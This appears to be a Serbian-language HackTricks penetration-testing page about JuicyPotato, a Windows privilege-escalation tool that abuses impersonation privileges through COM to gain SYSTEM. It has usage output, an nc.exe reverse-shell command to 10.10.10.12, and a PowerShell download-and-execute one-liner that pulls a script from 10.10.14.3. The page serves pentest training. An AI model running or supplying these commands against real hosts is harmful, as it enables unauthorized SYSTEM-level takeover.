# JuicyPotato

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato ne radi** na Windows Serveru 2019 i Windows 10 verziji 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) mogu se koristiti za **iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`**. _**Proverite:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (zloupotreba zlatnih privilegija) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Šećerom obogaćena verzija_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, sa malo soka, tj. **još jedan alat za eskalaciju privilegija sa lokalnog Windows servisnog naloga na NT AUTHORITY\SYSTEM**_

#### Juicypotato možete preuzeti sa [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Rezime <a href="#summary" id="summary"></a>

[**Iz juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i njegove [varijante](https://github.com/decoder-it/lonelypotato) koriste lanac eskalacije privilegija zasnovan na [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [servisu](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) koji ima MiTM slušaoca na `127.0.0.1:6666` i kada imate privilegije `SeImpersonate` ili `SeAssignPrimaryToken`. Tokom pregleda Windows build-a, otkrili smo postavku gde je `BITS` namerno onemogućen i zauzet je port `6666`.

Odlučili smo da oružamo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Pozdravite Juicy Potato**.

> Za teoriju, pogledajte [Rotten Potato - Eskalacija privilegija sa servisnih naloga na SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i pratite lanac veza i referenci.

Otkrili smo da, osim `BITS`-a, postoji nekoliko COM servera koje možemo zloupotrebiti. Samo trebaju:

1. biti instancirani od strane trenutnog korisnika, obično "servisnog korisnika" koji ima privilegije impersonacije
2. implementirati `IMarshal` interfejs
3. pokrenuti se kao privilegovan korisnik (SYSTEM, Administrator, ...)

Nakon nekih testiranja, dobili smo i testirali obimnu listu [interesantnih CLSID-ova](http://ohpe.it/juicy-potato/CLSID/) na nekoliko verzija Windows-a.

### Detalji o JuicyPotato <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vam omogućava da:

* **Ciljajte CLSID** _izaberite bilo koji CLSID koji želite._ [_Ovde_](http://ohpe.it/juicy-potato/CLSID/) _možete pronaći listu organizovanu po OS-u._
* **COM slušajući port** _definišite COM slušajući port koji preferirate (umesto marshalled hardkodiranog 6666)_
* **COM slušajuća IP adresa** _vezivanje servera na bilo koju IP adresu_
* **Režim kreiranja procesa** _u zavisnosti od privilegija impersoniranog korisnika, možete birati između:_
* `CreateProcessWithToken` (zahteva `SeImpersonate`)
* `CreateProcessAsUser` (zahteva `SeAssignPrimaryToken`)
* `oba`
* **Proces za pokretanje** _pokrenite izvršnu datoteku ili skriptu ako eksploatacija uspe_
* **Argumenti procesa** _prilagodite argumente pokrenutog procesa_
* **Adresa RPC servera** _za prikriven pristup možete se autentifikovati na eksterni RPC server_
* **RPC server port** _korisno ako želite da se autentifikujete na eksterni server, a firewall blokira port `135`..._
* **TEST režim** _pretežno za testiranje, tj. testiranje CLSID-ova. Kreira DCOM i ispisuje korisnika tokena. Pogledajte_ [_ovde za testiranje_](http://ohpe.it/juicy-potato/Test/)

### Upotreba <a href="#usage" id="usage"></a>

```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```

### Završne misli <a href="#final-thoughts" id="final-thoughts"></a>

[**Iz juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ako korisnik ima privilegije `SeImpersonate` ili `SeAssignPrimaryToken`, onda ste **SYSTEM**.

Gotovo je nemoguće sprečiti zloupotrebu svih ovih COM servera. Možete razmisliti o izmeni dozvola ovih objekata putem `DCOMCNFG`, ali srećno, to će biti izazovno.

Stvarno rešenje je zaštita osetljivih naloga i aplikacija koje se izvršavaju pod nalozima `* SERVICE`. Zaustavljanje `DCOM` bi svakako sprečilo ovu eksploataciju, ali bi moglo imati ozbiljan uticaj na osnovni operativni sistem.

Izvor: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Primeri

Napomena: Posetite [ovu stranicu](https://ohpe.it/juicy-potato/CLSID/) za listu CLSID-ova koje možete isprobati.

### Dobijanje reverznog shell-a sa nc.exe

```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```

### Powershell rev

Powershell rev (Powershell reverese shell) je tehnika koja omogućava napadaču da uspostavi udaljenu vezu sa ciljnim računarom putem Powershell-a. Ova tehnika se često koristi za preuzimanje kontrole nad ciljnim sistemom i izvršavanje napadačevih komandi. Da biste koristili Powershell rev, morate prvo generisati Powershell skriptu koja će se izvršiti na ciljnom računaru. Ova skripta će uspostaviti vezu sa napadačevim serverom i omogućiti napadaču da preuzme kontrolu nad ciljnim sistemom. Powershell rev je moćan alat koji se često koristi u naprednim napadima na Windows sisteme.

```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```

### Pokrenite novi CMD (ako imate RDP pristup)

![](<../../.gitbook/assets/image (37).png>)

## Problemi sa CLSID-om

Često se podrazumevani CLSID koji JuicyPotato koristi **ne radi** i eksploatacija ne uspeva. Obično je potrebno više pokušaja da se pronađe **radni CLSID**. Da biste dobili listu CLSID-ova koje treba isprobati za određeni operativni sistem, trebali biste posetiti ovu stranicu:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Provera CLSID-ova**

Prvo, trebaće vam neki izvršni fajlovi osim juicypotato.exe.

Preuzmite [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i učitajte ga u svoju PS sesiju, a zatim preuzmite i izvršite [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Taj skript će kreirati listu mogućih CLSID-ova za testiranje.

Zatim preuzmite [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(promenite putanju do liste CLSID-ova i do izvršnog fajla juicypotato) i izvršite ga. Počeće da isprobava svaki CLSID, a **kada se promeni broj porta, to će značiti da je CLSID uspeo**.

**Proverite** radne CLSID-ove **korišćenjem parametra -c**

## Reference

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
